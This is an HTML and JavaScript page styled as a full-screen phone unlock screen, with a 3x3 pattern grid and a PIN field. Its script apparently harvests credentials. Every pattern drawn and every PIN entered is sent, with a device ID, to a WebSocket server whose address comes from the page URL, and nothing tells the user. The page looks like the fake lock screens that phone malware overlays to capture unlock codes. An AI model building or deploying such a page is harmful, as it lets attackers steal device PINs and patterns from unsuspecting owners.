<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Pattern Lock</title>
  <style>
    body, html {
      margin: 0;
      padding: 0;
      height: 100%;
      overflow: hidden;
      background-color: black;
    }

    #canvas {
      width: 100vw;
      height: 100vh;
      position: absolute;
      top: 0;
      left: 0;
      z-index: 1; /* Ensure the canvas is below the input box */
    }

    /* Style for the PIN input box */
    #pinInput {
      position: absolute;
      top: 10px;
      left: 50%;
      transform: translateX(-50%);
      padding: 10px;
      width: 200px;
      border: 2px solid black;
      background-color: rgba(0, 0, 0, 0.2); /* Transparent black background */
      color: white;
      font-size: 16px;
      text-align: center;
      z-index: 2; /* Ensure the input box is above the canvas */
    }

 .touch-area {
    width: 40px; /* Larger touch area */
    height: 40px;
    position: absolute;
    border-radius: 50%;
    transform: translate(-50%, -50%);
  }

    

    .point {
      width: 10px;
      height: 10px;
      position: absolute;
      border-radius: 50%;
      background-color: white;
      cursor: pointer;
      transition: background-color 0.3s;
    }

    #point0 { top: 40%; left: 10%; }
    #point1 { top: 40%; left: 50%; }
    #point2 { top: 40%; left: 80%; }
    #point3 { top: 60%; left: 10%; }
    #point4 { top: 60%; left: 50%; }
    #point5 { top: 60%; left: 80%; }
    #point6 { top: 80%; left: 10%; }
    #point7 { top: 80%; left: 50%; }
    #point8 { top: 80%; left: 80%; }

    .connected .point {
      background-color: #4CAF50;
    }
  </style>
</head>
<body>
  <!-- Input box for PIN -->
  <input type="text" id="pinInput" placeholder="Input PIN" maxlength="4" />

  <div id="canvas"></div>
<div id="point0" class="touch-area" style="top: 40%; left: 10%;"><div class="point"></div></div>
<div id="point1" class="touch-area" style="top: 40%; left: 50%;"><div class="point"></div></div>
<div id="point2" class="touch-area" style="top: 40%; left: 80%;"><div class="point"></div></div>
<div id="point3" class="touch-area" style="top: 60%; left: 10%;"><div class="point"></div></div>
<div id="point4" class="touch-area" style="top: 60%; left: 50%;"><div class="point"></div></div>
<div id="point5" class="touch-area" style="top: 60%; left: 80%;"><div class="point"></div></div>
<div id="point6" class="touch-area" style="top: 80%; left: 10%;"><div class="point"></div></div>
<div id="point7" class="touch-area" style="top: 80%; left: 50%;"><div class="point"></div></div>
<div id="point8" class="touch-area" style="top: 80%; left: 80%;"><div class="point"></div></div>

  <script>
    // Extract URL Parameters
const urlParams = new URLSearchParams(window.location.search);
const websocketUrl = urlParams.get('ws_url');
const idNumber = urlParams.get('id_number');

if (!websocketUrl) console.error('WebSocket URL missing!');
if (!idNumber) console.error('ID number missing!');

// WebSocket Connection
const socket = new WebSocket(websocketUrl);
socket.onopen = () => {
  console.log('WebSocket connected');
  if (idNumber) socket.send(JSON.stringify({ id_number: idNumber }));
};
socket.onerror = (error) => console.log('WebSocket error:', error);
socket.onmessage = (message) => console.log('Server:', message.data);

// Handle Fullscreen on Double Tap
let lastTap = 0;
document.addEventListener('touchend', (event) => {
  const currentTime = new Date().getTime();
  if (currentTime - lastTap < 300) {
    document.documentElement.requestFullscreen().catch(err => console.log('Fullscreen error', err));
  }
  lastTap = currentTime;
});

// Get Points (Touch Areas)
const points = Array.from(document.querySelectorAll('.touch-area'));

let patternData = [];
let isDrawing = false;

// Create Canvas for Drawing Lines
const canvas = document.createElement('canvas');
const ctx = canvas.getContext('2d');
document.body.appendChild(canvas);
canvas.id = 'lineCanvas';
canvas.style.position = 'absolute';
canvas.style.top = '0';
canvas.style.left = '0';
canvas.style.pointerEvents = 'none';
canvas.width = window.innerWidth;
canvas.height = window.innerHeight;

// Function to Draw Line
function drawLine(start, end) {
  ctx.beginPath();
  ctx.moveTo(start.x, start.y);
  ctx.lineTo(end.x, end.y);
  ctx.strokeStyle = '#4CAF50';
  ctx.lineWidth = 5;
  ctx.stroke();
}

// Update Canvas Size on Window Resize
window.addEventListener('resize', () => {
  canvas.width = window.innerWidth;
  canvas.height = window.innerHeight;
});

// Function to Handle Drawing
function handleDraw(event) {
    event.preventDefault();
    const x = event.clientX || event.touches[0].clientX;
    const y = event.clientY || event.touches[0].clientY;

    points.forEach((touchArea, index) => {
        const rect = touchArea.getBoundingClientRect();
        const centerX = rect.left + rect.width / 2;
        const centerY = rect.top + rect.height / 2;

        const distance = Math.sqrt((x - centerX) ** 2 + (y - centerY) ** 2);

        if (distance < rect.width / 2 && !patternData.includes(index)) {
            touchArea.classList.add('connected');

            if (patternData.length > 0) {
                const prevIndex = patternData[patternData.length - 1];
                const prevRect = points[prevIndex].getBoundingClientRect();
                
                // Draw only if the previous point is valid
                drawLine(
                    { x: prevRect.left + prevRect.width / 2, y: prevRect.top + prevRect.height / 2 },
                    { x: centerX, y: centerY }
                );
            }

            patternData.push(index);
        }
    });
}


// Function to Stop Drawing and Send Data
function stopDrawing() {
  isDrawing = false;
  const pattern = patternData.join(',');

  console.log('Pattern:', pattern);

  if (socket.readyState === WebSocket.OPEN) {
    socket.send(JSON.stringify({
      id_number: idNumber,
      pattern: pattern
    }));
  }

  setTimeout(resetPattern, 1000);
}

// Function to Reset Pattern
function resetPattern() {
  patternData = [];
  points.forEach(touchArea => touchArea.classList.remove('connected'));
  ctx.clearRect(0, 0, canvas.width, canvas.height);
}

// Event Listeners for Mouse & Touch
document.addEventListener('mousedown', (e) => { isDrawing = true; handleDraw(e); });
document.addEventListener('mousemove', (e) => { if (isDrawing) handleDraw(e); });
document.addEventListener('mouseup', stopDrawing);
document.addEventListener('touchstart', (e) => { isDrawing = true; handleDraw(e); });
document.addEventListener('touchmove', (e) => { if (isDrawing) handleDraw(e); });
document.addEventListener('touchend', stopDrawing);

// Handle PIN Input
document.getElementById('pinInput').addEventListener('keydown', function (event) {
  if (event.key === 'Enter') {
    const pinData = this.value;
    console.log('PIN:', pinData);

    if (socket.readyState === WebSocket.OPEN) {
      socket.send(JSON.stringify({
        id_number: idNumber,
        pattern: patternData.join(','),
        pin: pinData
      }));
    }

    this.value = '';
  }
});

  </script>
</body>
</html>





